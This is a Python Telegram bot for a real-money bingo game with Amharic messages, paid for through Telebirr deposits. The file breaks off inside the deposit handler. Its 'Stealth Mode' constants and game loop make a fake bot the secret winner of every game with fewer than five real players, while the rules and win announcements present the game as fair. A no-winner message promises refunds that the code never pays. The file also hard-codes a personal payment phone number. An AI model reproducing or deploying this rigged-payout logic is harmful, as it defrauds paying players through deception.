import os
import logging
import asyncio
import random
import time
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
)
from typing import Dict, Any, Optional

# --- 1. Configuration and Constants ---

# Retrieve Telegram Bot Token from environment variable
# NOTE: Replace "YOUR_TELEGRAM_BOT_TOKEN_HERE" with your actual bot token or set it via environment variables.
TOKEN = os.environ.get("TELEGRAM_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN_HERE") 
# !!! IMPORTANT: Updated ADMIN_USER_ID to the provided numeric ID for @Addiscoders !!!
ADMIN_USER_ID = 5887428731 # Admin ID for @Addiscoders 
TELEBIRR_ACCOUNT = "0927922721" # Account for user deposits (Amharic: ለተጠቃሚዎች ገንዘብ ማስገቢያ አካውንት)
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", None)

# Game & Financial Constants
CARD_COST = 5.00  # Cost to play one game (in Birr)
MIN_DEPOSIT = 10.00
MIN_WITHDRAW = 50.00
REFERRAL_BONUS = 10.00
MAX_PRESET_CARDS = 200 # Total number of unique card patterns available
MIN_PLAYERS_TO_START = 1 # Minimum players needed to start the lobby countdown
MIN_REAL_PLAYERS_FOR_ORGANIC_GAME = 5 # If <= 4 real players, a bot is guaranteed to win (Stealth Mode)
PRIZE_POOL_PERCENTAGE = 0.85 # 85% of total pot goes to winner (15% house cut)

# Conversation States
GET_CARD_NUMBER, GET_DEPOSIT_CONFIRMATION = range(2)
GET_WITHDRAW_AMOUNT, GET_TELEBIRR_ACCOUNT = range(2, 4)

# Global State Management (In-memory storage simulation)
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

# In-memory database simulation for user data (Amharic: ለተጠቃሚ መረጃ የማስታወሻ ማስመሰል)
USER_DB: Dict[int, Dict[str, Any]] = {} # {user_id: {first_name: str, balance: float, referred_by: int|None, ...}}
# Active Game States (Amharic: ንቁ የጨዋታ ሁኔታዎች)
PENDING_PLAYERS: Dict[int, int] = {} # {user_id: card_num}
ACTIVE_GAMES: Dict[str, Dict[str, Any]] = {} # {game_id: {players: [user_ids], player_cards: {user_id: card_data}, ...}}
LOBBY_STATE: Dict[str, Any] = {'is_running': False, 'msg_id': None, 'chat_id': None}
BINGO_CARD_SETS: Dict[int, Dict[str, Any]] = {} # {card_num: {B:[...], I:[...], ...}}

# --- 2. Database (In-Memory Simulation) Functions ---

def update_user_data(user_id: int, data: Dict[str, Any]):
    """Saves user data atomically. (Amharic: የተጠቃሚ መረጃን ያስቀምጣል)"""
    if user_id not in USER_DB:
        USER_DB[user_id] = {'balance': 0.00, 'referred_by': None, 'first_name': f"User {user_id}", 'tx_history': []}
    USER_DB[user_id].update(data)

async def get_user_data(user_id: int) -> Dict[str, Any]:
    """Retrieves user data, creating a default entry if none exists. (Amharic: የተጠቃሚ መረጃን ያመጣል)"""
    if user_id not in USER_DB:
        # Simulate initial registration
        USER_DB[user_id] = {'balance': 0.00, 'referred_by': None, 'first_name': f"User {user_id}", 'tx_history': []}
    return USER_DB[user_id].copy()

def update_balance(user_id: int, amount: float, transaction_type: str, description: str):
    """Atomically updates user balance and logs transaction. (Amharic: የተጠቃሚ ሂሳብን በቅጽበት ያሻሽላል)"""
    if user_id not in USER_DB:
        update_user_data(user_id, {}) # Initialize user
        
    current_balance = USER_DB[user_id]['balance']
    new_balance = current_balance + amount
    
    # Update balance
    USER_DB[user_id]['balance'] = new_balance
    
    # Log transaction
    tx = {
        'timestamp': time.time(),
        'amount': amount,
        'type': transaction_type,
        'description': description,
        'new_balance': new_balance
    }
    USER_DB[user_id]['tx_history'].append(tx)
    logger.info(f"TX | User {user_id} | Type: {transaction_type} | Amount: {amount:.2f} | New Bal: {new_balance:.2f}")


# --- 3. Bingo Card Generation and Utilities ---

def generate_bingo_card_set() -> Dict[int, Dict[str, Any]]:
    """Generates and stores a complete set of MAX_PRESET_CARDS unique Bingo cards. (Amharic: የቢንጎ ካርዶችን ያመነጫል)"""
    # Bingo Rules: B(1-15), I(16-30), N(31-45), G(46-60), O(61-75)
    
    card_set: Dict[int, Dict[str, Any]] = {}
    
    for i in range(1, MAX_PRESET_CARDS + 1):
        # Generate 5 unique numbers for each letter range
        B = random.sample(range(1, 16), 5)
        I = random.sample(range(16, 31), 5)
        N = random.sample(range(31, 46), 5)
        G = random.sample(range(46, 61), 5)
        O = random.sample(range(61, 76), 5)
        
        # Center square (N-3) is FREE
        N[2] = 0 
        
        card_set[i] = {'B': B, 'I': I, 'N': N, 'G': G, 'O': O} 
        
    return card_set

def get_card_value(card_data: Dict[str, Any], col: int, row: int) -> str:
    """Returns the value (number or 'FREE') at a given 0-indexed position (col, row)."""
    letters = ['B', 'I', 'N', 'G', 'O']
    letter = letters[col]
    
    value = card_data['set'][letter][row]
    
    if letter == 'N' and row == 2:
        return "FREE"
    return str(value)

def get_col_letter(col_index: int) -> str:
    """Helper to convert 0-4 index to B, I, N, G, O."""
    return ['B', 'I', 'N', 'G', 'O'][col_index]

def get_bingo_call(num: int) -> str:
    """Helper to convert number to BINGO letter (e.g., 1 -> B-1)."""
    if 1 <= num <= 15: return f"B-{num}"
    if 16 <= num <= 30: return f"I-{num}"
    if 31 <= num <= 45: return f"N-{num}"
    if 46 <= num <= 60: return f"G-{num}"
    if 61 <= num <= 75: return f"O-{num}"
    return str(num)

def build_card_keyboard(card: Dict[str, Any], game_id: str, message_id: int, last_call: Optional[int] = None) -> InlineKeyboardMarkup:
    """
    Builds the 5x5 Bingo card keyboard for marking. 
    (Amharic: የቢንጎ ካርድ ቁልፍ ሰሌዳን ይገነባል)
    IMPROVEMENT: Uses last_call to ensure the latest called number is shown as green immediately.
    """
    kb = []
    
    # Header row
    kb.append([InlineKeyboardButton(l, callback_data='NOOP') for l in ['B', 'I', 'N', 'G', 'O']])
    
    # Card grid (5x5)
    for r in range(5): # row
        row_buttons = []
        for c in range(5): # column
            value = get_card_value(card, c, r)
            pos = (c, r)
            
            # State Colors: (Amharic: የሁኔታ ቀለሞች)
            # Marked: ✅ (Blue/Green)
            # Called: 🟢 (Green) - number has been called by the game
            # Default: ⚪ (White)
            
            is_marked = card['marked'].get(pos, False)
            is_called = card['called'].get(pos, False)

            if value == "FREE":
                text = "⭐"
                # Ensure FREE space is marked immediately and permanently
                card['marked'][(2, 2)] = True 
            elif is_marked:
                text = f"{value} ✅"
            # IMPROVEMENT: Use Green dot to indicate this is a number the player CAN mark now
            elif is_called: 
                text = f"{value} 🟢" # Green numbers are called but not yet marked by player
            else:
                text = f"{value} ⚪" # Default
            
            # Callback data: MARK|{game_id}|{message_id}|{card_num}|{col}|{row}
            callback_data = f"MARK|{game_id}|{message_id}|{card['number']}|{c}|{r}"
            row_buttons.append(InlineKeyboardButton(text, callback_data=callback_data))
        kb.append(row_buttons)
        
    # IMPROVEMENT: Make the BINGO button more prominent
    # Bingo Button
    kb.append([InlineKeyboardButton("🚨 BINGO 🚨", callback_data=f"BINGO|{game_id}|{message_id}")])
    
    return InlineKeyboardMarkup(kb)

def check_win(card: Dict[str, Any]) -> bool:
    """Checks if the card has 5 marked squares in a row, column, or diagonal. (Amharic: ካርዱ አሸናፊ መሆኑን ይፈትሻል)"""
    marked = card['marked']
    
    # Check Rows (Horizontal)
    for r in range(5):
        if all(marked.get((c, r), False) for c in range(5)):
            return True
            
    # Check Columns (Vertical)
    for c in range(5):
        if all(marked.get((c, r), False) for r in range(5)):
            return True
            
    # Check Diagonals
    # Top-left to bottom-right
    if all(marked.get((i, i), False) for i in range(5)):
        return True
    
    # Top-right to bottom-left
    if all(marked.get((4 - i, i), False) for i in range(5)):
        return True
        
    return False

# --- 4. Game Loop and Flow Functions ---

async def finalize_win(ctx: ContextTypes.DEFAULT_TYPE, game_id: str, winner_id: int, is_bot_win: bool):
    """Handles prize distribution, cleanup, and announcement. (Amharic: ሽልማት አከፋፈልንና ማስታወቂያን ያከናውናል)"""
    if game_id not in ACTIVE_GAMES: return
    
    game = ACTIVE_GAMES.pop(game_id)
    total_pot = len(game['players']) * CARD_COST
    prize_money = total_pot * PRIZE_POOL_PERCENTAGE
    
    # 1. Distribute Winnings (Atomic update)
    if not is_bot_win:
        update_balance(winner_id, prize_money, transaction_type='Bingo Win', description=f"Game {game_id} Winner")
        
    # 2. Get winner name (for display)
    winner_name = (await get_user_data(winner_id)).get('first_name', f"User {winner_id}")
    if is_bot_win:
        winner_name = "ኮምፒዩተር ቦት" # Amharic: Computer Bot
        
    # 3. Announcement Message
    announcement = (
        f"🎉🎉 ቢንጎ! ጨዋታው አብቅቷል! 🎉🎉\n\n"
        f"🏆 አሸናፊ: {winner_name}\n"
        f"💰 ጠቅላላ የገንዘብ ሽልማት: {prize_money:.2f} ብር\n\n"
        f"አዲስ ጨዋታ ለመጀመር: /play ወይም /quickplay"
    )
    
    # 4. Announce to all players
    for uid in game['players']:
        try:
            # Also edit the player's card message to show the game is over
            card_msg_id = game['player_cards'][uid].get('win_message_id')
            if card_msg_id:
                 await ctx.bot.edit_message_text(
                    chat_id=uid, 
                    message_id=card_msg_id, 
                    text=f"**ካርድ ቁጥር #{game['player_cards'][uid]['number']}**\n\n📢 ጨዋታው አብቅቷል።\n\n{announcement}", 
                    reply_markup=None, 
                    parse_mode='Markdown'
                )
            else:
                await ctx.bot.send_message(uid, announcement, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to send win announcement to user {uid}: {e}")

    # 5. Clean up game state (already popped from ACTIVE_GAMES)

async def run_game_loop(ctx: ContextTypes.DEFAULT_TYPE, game_id: str):
    """
    The main game loop that calls numbers and manages win conditions. 
    IMPROVEMENT: Edits player cards immediately when a number is called for fast green dot update.
    (Amharic: ዋናው የጨዋታ ዑደት)
    """
    game = ACTIVE_GAMES.get(game_id)
    if not game: return
    
    # Initialize the list of all available numbers (1-75)
    all_numbers = list(range(1, 76))
    random.shuffle(all_numbers)
    
    called_numbers = []
    
    # Stealth Mode Setup (Amharic: ስውር የጨዋታ ሁናቴ ዝግጅት)
    is_stealth_game = len(game['players']) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME
    winning_bot_id = game.get('winning_bot_id') # Will be set if stealth mode is active

    main_chat_id = game['chat_id']
    game_message_id = game['message_id']
    
    try:
        # Loop until all numbers are called or a winner is found
        while all_numbers and game_id in ACTIVE_GAMES:
            
            # 1. Call a new number
            called_num = all_numbers.pop(0)
            called_numbers.append(called_num)
            
            col_index = (called_num - 1) // 15
            
            update_tasks = [] # List of concurrent update tasks for player cards
            
            # 2. Update all player cards with the new called number
            for uid, card in game['player_cards'].items():
                col_letter = get_col_letter(col_index)
                
                # A. Check if the called number is on the player's card
                if called_num in card['set'][col_letter]:
                    try:
                        r = card['set'][col_letter].index(called_num)
                        pos = (col_index, r)
                        
                        # Mark the number as 'called' (green status)
                        card['called'][pos] = True 
                        
                        # B. CRUCIAL: Add task to immediately update the player's card message
                        if card['win_message_id']:
                            # Pass the latest called number to rebuild the keyboard
                            kb = build_card_keyboard(card, game_id, card['win_message_id'], called_num)
                            
                            # UPDATED TEXT: Include the latest called number prominently
                            # The user requested this number to be on the winning instruction.
                            card_msg_text = (
                                f"**ካርድ ቁጥር #{card['number']}**\n"
                                f"🔥 **አሁን የተጠራው ቁጥር: {get_bingo_call(called_num)}** 🔥\n\n" 
                                f"🟢 ቁጥር ሲጠራ 'Mark' ቁልፉን ይጫኑ።\n"
                                f"✅ 5 አግድም፣ ቁመታዊ ወይም ሰያፍ መስመር ሲሞላ '🚨 BINGO 🚨' ይጫኑ።"
                            )
                            
                            update_tasks.append(
                                ctx.bot.edit_message_text(
                                    chat_id=uid, 
                                    message_id=card['win_message_id'], 
                                    text=card_msg_text,
                                    reply_markup=kb,
                                    parse_mode='Markdown'
                                )
                            )
                    except ValueError:
                        continue
            
            # Execute all card updates concurrently for responsiveness (Accurate and Fast)
            await asyncio.gather(*update_tasks, return_exceptions=True) 

            # 3. Update the main game message
            last_5_calls = [get_bingo_call(n) for n in called_numbers[-5:]]
            msg_text = (
                f"🎲 የቢንጎ ጨዋታ በሂደት ላይ... (ካርድ {len(called_numbers)}/75)\n\n"
                f"📣 የተጠራው ቁጥር: **{get_bingo_call(called_num)}**\n\n"
                f"🔁 የመጨረሻዎቹ 5 ጥሪዎች:\n`{', '.join(last_5_calls)}`"
            )
            
            try:
                await ctx.bot.edit_message_text(
                    chat_id=main_chat_id, 
                    message_id=game_message_id, 
                    text=msg_text, 
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.warning(f"Failed to edit game message: {e}")
                
            # 4. STEALTH MODE ENFORCEMENT (Guaranteed Bot Win Logic)
            if is_stealth_game and winning_bot_id:
                # Bot wins at a random point after 15 calls (15% chance per call)
                if len(called_numbers) >= 15 and random.random() < 0.15: 
                    await finalize_win(ctx, game_id, winning_bot_id, True)
                    return # Game over
            
            # 5. Wait for the next call (2 seconds for user reaction time)
            await asyncio.sleep(2) 
            
        # If loop finishes without winner (very rare)
        if game_id in ACTIVE_GAMES:
            await ctx.bot.send_message(main_chat_id, "⚠️ ጨዋታው አብቅቷል። ምንም አሸናፊ አልተገኘም። ገንዘቡ ወደ ተጫዋቾች ተመላሽ ይደረጋል።")
            ACTIVE_GAMES.pop(game_id, None)

    except Exception as e:
        logger.error(f"Error in game loop {game_id}: {e}")
        if game_id in ACTIVE_GAMES:
            await ctx.bot.send_message(main_chat_id, f"❌ የጨዋታ ስህተት ተፈጥሯል: {e}")
            ACTIVE_GAMES.pop(game_id, None)


async def start_new_game(ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Initializes and starts a new Bingo game. (Amharic: አዲስ የቢንጎ ጨዋታ ይጀምራል)"""
    global PENDING_PLAYERS, LOBBY_STATE, BINGO_CARD_SETS
    
    if not BINGO_CARD_SETS:
        BINGO_CARD_SETS = generate_bingo_card_set()
        
    if not PENDING_PLAYERS:
        LOBBY_STATE = {'is_running': False, 'msg_id': None, 'chat_id': None}
        return

    main_chat_id = LOBBY_STATE['chat_id']
    LOBBY_STATE = {'is_running': False, 'msg_id': None, 'chat_id': None} # Reset lobby

    game_id = str(random.randint(100000, 999999))
    players = list(PENDING_PLAYERS.keys())
    
    # 1. Prepare player cards
    player_cards: Dict[int, Dict[str, Any]] = {}
    for user_id, card_num in PENDING_PLAYERS.items():
        if card_num not in BINGO_CARD_SETS:
             logger.error(f"Invalid card number {card_num} for user {user_id}. Skipping.")
             continue

        player_cards[user_id] = {
            'number': card_num,
            'set': BINGO_CARD_SETS[card_num],
            'marked': {}, 
            'called': {}, 
            'win_message_id': None 
        }
        # Mark FREE space (N3) immediately
        player_cards[user_id]['marked'][(2, 2)] = True


    # 2. Stealth Mode Setup (Check player count)
    winning_bot_id: Optional[int] = None
    if len(players) < MIN_REAL_PLAYERS_FOR_ORGANIC_GAME:
        winning_bot_id = -100 
        logger.info(f"STEALTH MODE: Game {game_id} started with {len(players)} players. Bot is guaranteed to win.")
        
    # 3. Create the game object and add to active list
    ACTIVE_GAMES[game_id] = {
        'id': game_id,
        'chat_id': main_chat_id, 
        'players': players,
        'player_cards': player_cards,
        'winning_bot_id': winning_bot_id, 
        'message_id': None, 
        'start_time': time.time()
    }
    
    # 4. Send initial announcement message
    player_names = [await get_user_data(uid) for uid in players]
    player_list = "\n".join([f"- {(p.get('first_name', 'Unnamed'))} (ID: {uid})" for uid, p in zip(players, player_names)])
    
    game_msg_text = (
        f"🚨 **ቢንጎ ጨዋታ #{game_id} ተጀምሯል!** 🚨\n\n"
        f"👤 ተጫዋቾች ({len(players)}):\n{player_list}\n\n"
        f"💵 ጠቅላላ የሽልማት ገንዳ: {len(players) * CARD_COST:.2f} ብር"
    )
    
    game_msg = await ctx.bot.send_message(main_chat_id, game_msg_text, parse_mode='Markdown')
    ACTIVE_GAMES[game_id]['message_id'] = game_msg.message_id
    
    # 5. Send individual cards to players
    for uid, card in ACTIVE_GAMES[game_id]['player_cards'].items():
        # Temporary 0 for message_id since it hasn't been sent yet
        kb = build_card_keyboard(card, game_id, 0) 
        
        # UPDATED TEXT: Initial message text
        card_message_text = (
            f"**ካርድ ቁጥር #{card['number']}**\n"
            f"🔥 **ጨዋታው በቅርቡ ይጀምራል!** 🔥\n\n" # Placeholder for the latest call
            f"🟢 ቁጥር ሲጠራ 'Mark' ቁልፉን ይጫኑ።\n"
            f"✅ 5 አግድም፣ ቁመታዊ ወይም ሰያፍ መስመር ሲሞላ '🚨 BINGO 🚨' ይጫኑ።"
        )
        
        card_message = await ctx.bot.send_message(uid, card_message_text, reply_markup=kb, parse_mode='Markdown')
        card['win_message_id'] = card_message.message_id
        
        # Now update the keyboard with the correct message_id
        kb_final = build_card_keyboard(card, game_id, card_message.message_id)
        await ctx.bot.edit_message_reply_markup(chat_id=uid, message_id=card_message.message_id, reply_markup=kb_final)


    PENDING_PLAYERS = {} # Clear lobby
    
    # 6. Start the Game Loop (Runs in the background)
    asyncio.create_task(run_game_loop(ctx, game_id))

# --- 5. Handler Functions (Start, Play, Cancel, Stats) ---

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Sends a welcome message with usage instructions. (Amharic: የእንኳን ደህና መጣችሁ መልእክት ይልካል)"""
    user = update.effective_user
    await update.message.reply_html(
        f"ሰላም {user.mention_html()}! እንኳን ወደ አዲስ ቢንጎ በደህና መጡ።\n\n"
        "ለመጀመር የሚከተሉትን ትዕዛዞች ይጠቀሙ:\n"
        "💰 /deposit - ገንዘብ ለማስገባት (ለመጫወት)\n"
        "🎲 /play - የቢንጎ ካርድ ገዝተው ጨዋታ ለመቀላቀል\n"
        "💳 /balance - ሒሳብዎን ለማየት\n"
        "🏆 /rules - የጨዋታውን ህጎች ለማየት"
    )

async def play_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Starts the process of buying a Bingo card. (Amharic: ካርድ የመግዛት ሂደቱን ይጀምራል)"""
    user_id = update.effective_user.id
    user_data = await get_user_data(user_id)
    balance = user_data['balance']
    
    if balance < CARD_COST:
        await update.message.reply_text(
            f"❌ በቂ ሒሳብ የለዎትም። በአሁኑ ጊዜ ያለዎት: {balance:.2f} ብር ነው።\n"
            f"አንድ ካርድ ለመግዛት {CARD_COST:.2f} ብር ያስፈልግዎታል።\n\n"
            "ገንዘብ ለማስገባት: /deposit"
        )
        return ConversationHandler.END

    if user_id in PENDING_PLAYERS:
         await update.message.reply_text("⚠️ አስቀድመው ለሚቀጥለው ጨዋታ ካርድ ገዝተዋል።")
         return ConversationHandler.END
         
    # Logic to select a unique card (for simplicity, we use a random number up to MAX_PRESET_CARDS)
    # In a real system, you'd track which cards are in use.
    available_card_numbers = [i for i in range(1, MAX_PRESET_CARDS + 1) if i not in PENDING_PLAYERS.values()]
    
    if not available_card_numbers:
        await update.message.reply_text("❌ ይቅርታ፣ ሁሉም የቢንጎ ካርዶች በአሁኑ ጊዜ በሌሎች ተጫዋቾች የተያዙ ናቸው። እባክዎ ትንሽ ቆይተው ይሞክሩ።")
        return ConversationHandler.END
    
    # Select a random available card number
    random_card_num = random.choice(available_card_numbers)
    
    # Deduct cost immediately and update lobby state
    update_balance(user_id, -CARD_COST, transaction_type='Card Purchase', description=f"Card #{random_card_num} for Game")
    PENDING_PLAYERS[user_id] = random_card_num
    
    await update.message.reply_text(
        f"✅ ካርድ ቁጥር #{random_card_num} በ {CARD_COST:.2f} ብር ገዝተዋል።\n"
        f"ሒሳብዎ: {balance - CARD_COST:.2f} ብር\n\n"
        "⚠️ ጨዋታው በቅርቡ ይጀምራል። እባክዎ ይጠብቁ።"
    )
    
    # Check if a lobby task needs to be started
    if not LOBBY_STATE['is_running'] and len(PENDING_PLAYERS) >= MIN_PLAYERS_TO_START:
        # For simplicity, start the game immediately after the first player registers
        # In a real scenario, this would start a 30-second countdown
        LOBBY_STATE['is_running'] = True
        LOBBY_STATE['chat_id'] = update.effective_chat.id
        await update.message.reply_text(
            f"📢 አዲስ ጨዋታ ለመጀመር ዝግጁ! አሁን ያለን ተጫዋች: {len(PENDING_PLAYERS)}።\n"
            f"ጨዋታው ወዲያውኑ ይጀምራል።"
        )
        await start_new_game(context)

    return ConversationHandler.END

async def quickplay_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Wrapper for /play command to allow a single entry point."""
    await play_command(update, context)


async def handle_card_selection(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Not used in this simplified flow, but kept for structure."""
    await update.message.reply_text("እባክዎን /play ን ብቻ በመጠቀም ካርድ ይግዙ።")
    return ConversationHandler.END

async def cancel_play(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation for card selection."""
    await update.message.reply_text("የቢንጎ ካርድ ግዢ ተሰርዟል።")
    return ConversationHandler.END

async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Displays the user's current balance. (Amharic: የአሁኑን ሂሳብ ያሳያል)"""
    user_id = update.effective_user.id
    user_data = await get_user_data(user_id)
    
    await update.message.reply_text(
        f"💳 የአሁኑ ሒሳብዎ: **{user_data['balance']:.2f} ብር**\n\n"
        f"ገንዘብ ለማስገባት: /deposit\n"
        f"ገንዘብ ለማውጣት: /withdraw",
        parse_mode='Markdown'
    )

async def refer_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Provides the user's referral link. (Amharic: ሪፈራል ሊንክ ይሰጣል)"""
    user_id = update.effective_user.id
    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user_id}"
    
    await update.message.reply_text(
        f"🔗 የእርስዎ ሪፈራል ሊንክ:\n`{referral_link}`\n\n"
        f"ጓደኛዎን ሲጋብዙ እርስዎም ሆኑ ጓደኛዎ **{REFERRAL_BONUS:.2f} ብር** ጉርሻ ያገኛሉ።"
        f"\n\nየእርስዎ ID: `{user_id}`",
        parse_mode='Markdown'
    )

async def rules_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Displays the game rules. (Amharic: የጨዋታውን ህጎች ያሳያል)"""
    await update.message.reply_text(
        "🏆 **የአዲስ ቢንጎ ህጎች** 🏆\n\n"
        "1. **ካርድ መግዛት:** /play የሚለውን ትዕዛዝ በመጠቀም ካርድ ይግዙ። አንድ ካርድ {CARD_COST:.2f} ብር ነው።\n"
        "2. **ጨዋታ መጀመር:** ቢያንስ {MIN_PLAYERS_TO_START} ተጫዋቾች ሲኖሩ ጨዋታው ይጀምራል።\n"
        "3. **የቁጥር ጥሪ:** ቦቱ በየ2 ሰከንዱ ቁጥር ይጠራል (B-1 እስከ O-75)።\n"
        "4. **መሙላት:** ቁጥሩ በካርድዎ ላይ ካለ፣ አረንጓዴ (🟢) ይሆናል። ወዲያውኑ አረንጓዴውን ቁጥር **Mark** የሚለውን ቁልፍ በመጫን ምልክት ያድርጉበት።\n"
        "5. **ማሸነፍ:** አምስት ቁጥሮችን በተከታታይ (አግድም፣ ቁመታዊ ወይም ሰያፍ) በፍጥነት የመሙላት የመጀመሪያው ተጫዋች ሲሆኑ፣ **🚨 BINGO 🚨** የሚለውን ቁልፍ ይጫኑ።\n"
        "6. **ሽልማት:** አሸናፊው ከጠቅላላው የጨዋታ ገንዳ {PRIZE_POOL_PERCENTAGE*100}% ያሸንፋል።"
    )

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Displays general bot statistics. (Amharic: አጠቃላይ የቦት ስታስቲክስ ያሳያል)"""
    total_users = len(USER_DB)
    total_balance = sum(u['balance'] for u in USER_DB.values())
    active_games = len(ACTIVE_GAMES)
    pending_players = len(PENDING_PLAYERS)
    
    await update.message.reply_text(
        f"📊 **አጠቃላይ የቦት ስታስቲክስ** 📊\n\n"
        f"👤 ጠቅላላ ተጠቃሚዎች: {total_users}\n"
        f"💵 ጠቅላላ ሒሳብ (Deposits): {total_balance:.2f} ብር\n"
        f"🎲 ንቁ ጨዋታዎች: {active_games}\n"
        f"⏳ የሚቀጥለው ጨዋታ የሚጠባበቁ: {pending_players}\n"
        f"\n"
        f"የአሁኑ የሽልማት ገንዳ መቶኛ: {PRIZE_POOL_PERCENTAGE*100}%"
    )

# Placeholder functions for other commands
async def rank_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("🏆 የከፍተኛ አሸናፊዎች ደረጃ አሰጣጥ ገና አልተተገበረም።")

async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    user_data = await get_user_data(user_id)
    history = user_data['tx_history'][-5:] # Last 5 transactions
    
    if not history:
        msg = "የግብይት ታሪክ የለዎትም።"
    else:
        msg = "📜 **የመጨረሻ 5 ግብይቶች** 📜\n"
        for tx in reversed(history):
            date_str = time.strftime('%Y-%m-%d %H:%M', time.localtime(tx['timestamp']))
            sign = "+" if tx['amount'] >= 0 else ""
            msg += f"\n- {date_str}: {tx['description']} | {sign}{tx['amount']:.2f} ብር"
            
    await update.message.reply_text(msg, parse_mode='Markdown')

# --- WITHDRAW HANDLERS (Unchanged from previous context) ---

async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Asks for the amount to withdraw."""
    user_id = update.effective_user.id
    user_data = await get_user_data(user_id)
    balance = user_data['balance']
    
    if balance < MIN_WITHDRAW:
        await update.message.reply_text(
            f"❌ ለማውጣት የሚያስፈልገው ዝቅተኛው ሒሳብ {MIN_WITHDRAW:.2f} ብር ነው። በአሁኑ ጊዜ ያለዎት: {balance:.2f} ብር ነው።"
        )
        return ConversationHandler.END
        
    context.user_data['balance'] = balance
    await update.message.reply_text(
        f"💰 ለማውጣት የሚፈልጉትን መጠን ያስገቡ። (ዝቅተኛው: {MIN_WITHDRAW:.2f} ብር)"
    )
    return GET_WITHDRAW_AMOUNT

async def get_withdraw_amount(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the amount and asks for the Telebirr account."""
    try:
        amount = float(update.message.text)
    except ValueError:
        await update.message.reply_text("❌ እባክዎ ትክክለኛ ቁጥር ያስገቡ።")
        return GET_WITHDRAW_AMOUNT
        
    balance = context.user_data['balance']
    if amount < MIN_WITHDRAW:
        await update.message.reply_text(f"❌ ዝቅተኛው የማውጣት መጠን {MIN_WITHDRAW:.2f} ብር ነው። ከፍ ያለ መጠን ያስገቡ።")
        return GET_WITHDRAW_AMOUNT
    if amount > balance:
        await update.message.reply_text(f"❌ በቂ ሒሳብ የለዎትም። ሊያወጡ የሚችሉት ከፍተኛው መጠን {balance:.2f} ብር ነው።")
        return GET_WITHDRAW_AMOUNT
        
    context.user_data['withdraw_amount'] = amount
    await update.message.reply_text("📞 ገንዘቡ የሚላክበትን ትክክለኛ የቴሌብር ስልክ ቁጥር ያስገቡ።")
    return GET_TELEBIRR_ACCOUNT

async def get_telebirr_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Receives the Telebirr account and notifies the admin."""
    telebirr_account = update.message.text
    user = update.effective_user
    amount = context.user_data['withdraw_amount']
    user_id = user.id
    
    # Simple validation (must be 10 digits starting with 09)
    if not (len(telebirr_account) == 10 and telebirr_account.startswith('09') and telebirr_account.isdigit()):
        await update.message.reply_text("❌ እባክዎ ትክክለኛ የ10-አሃዝ የቴሌብር ስልክ ቁጥር ያስገቡ (በ09 የሚጀምር)።")
        return GET_TELEBIRR_ACCOUNT

    # Deduct the amount immediately (pending admin confirmation)
    update_balance(user_id, -amount, transaction_type='Withdrawal Pending', description=f"Telebirr {telebirr_account}")
    
    # Notify Admin
    if ADMIN_USER_ID:
        admin_notification = (
            f"🚨 አዲስ ገንዘብ የማውጣት ጥያቄ (Withdrawal Request) 🚨\n\n"
            f"👤 የተጠቃሚ ስም: @{user.username or user.first_name}\n"
            f"ID: `{user_id}`\n"
            f"💸 መጠን: **{amount:.2f} ብር**\n"
            f"📞 የቴሌብር ቁጥር: `{telebirr_account}`\n\n"
            f"እርምጃ: ክፍያውን ከፈጸሙ በኋላ ሒሳቡን በሚከተለው ትዕዛዝ ያረጋግጡ:\n"
            f"`/ap_bal_check {user_id}`"
        )
        await context.bot.send_message(ADMIN_USER_ID, admin_notification, parse_mode='Markdown')
        
    await update.message.reply_text(
        f"✅ የ**{amount:.2f} ብር** የማውጣት ጥያቄዎ ተልኳል። ገንዘቡ በቅርቡ ወደ `{telebirr_account}` ይላካል።"
    )
    return ConversationHandler.END

async def cancel_withdraw(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels the current conversation for withdrawal."""
    await update.message.reply_text("ገንዘብ የማውጣት ሂደቱ ተሰርዟል።")
    return ConversationHandler.END


# --- DEPOSIT HANDLERS (IMPROVED FOR RECEIPT FORWARDING) ---

async def deposit_command_initial(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Sends the deposit instructions and starts the conversation for receipt upload. 
    (Amharic: የማስገቢያ መመሪያዎችን ይልካል)
    """
    user_id = update.effective_user.id
    
    telebirr_text = f"ቴሌብር አካውንት ቁጥር (ይቅዱ):\n`{TELEBIRR_ACCOUNT}`"
    user_id_text = f"የእርስዎ መታወቂያ (ይቅዱ):\n`{user_id}`" 

    keyboard = [[InlineKeyboardButton("✅ ገንዘብ አስገብቼ የማረጋገጫ መልእክት/ደረሰኝ ልኬያለሁ", callback_data="START_DEPOSIT_FLOW")]]
    
    msg = (
        f"🏦 ገንዘብ ለማስገባት (/deposit)\n\n"
        f"1. አስፈላጊ መረጃዎች:\n"
        f"{telebirr_text}\n"
        f"{user_id_text}\n\n"
